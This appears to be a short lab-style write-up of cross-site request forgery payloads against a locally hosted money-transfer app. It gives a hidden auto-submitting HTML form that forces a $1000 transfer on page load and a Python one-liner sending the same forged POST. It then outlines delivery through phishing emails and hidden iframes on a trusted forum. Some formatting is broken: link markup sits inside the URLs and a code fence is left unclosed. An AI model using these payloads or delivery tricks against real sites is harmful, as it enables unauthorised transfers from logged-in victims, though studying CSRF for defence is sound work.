# CSRF Payloads

## Payload 1: Auto-submitting HTML Form
This payload uses a hidden form that automatically submits a transfer request for $1000 when the page loads.

```html
<html>
  <body onload="document.forms[0].submit()">
    <form action="[http://127.0.0.1:8080/transfer](http://127.0.0.1:8080/transfer)" method="POST">
      <input type="hidden" name="amount" value="1000" />
      <input type="submit" value="Transfer Money" />
    </form>
  </body>
</html>
Payload 2: Python Terminal Script
This payload uses a Python one-liner in the terminal to send a forged POST request directly to the application.

Bash
python3 -c "import urllib.request; req=urllib.request.Request('[http://127.0.0.1:8080/transfer](http://127.0.0.1:8080/transfer)', data=b'amount=1000', headers={'Content-Type':'application/x-www-form-urlencoded'}, method='POST');



try:
 r=urllib.request.urlopen(req); print(r.status, r.read().decode())
except Exception as e: print(e)"
Exploitation Scenarios


Phishing Email: An attacker sends the victim a deceptive email containing a link to the HTML payload. If the victim clicks the link while authenticated in the app, the money is transferred.

Hidden Iframe: The attacker embeds the HTML payload in a hidden iframe on a trusted forum. When the victim visits the forum, the payload executes automatically in the background.
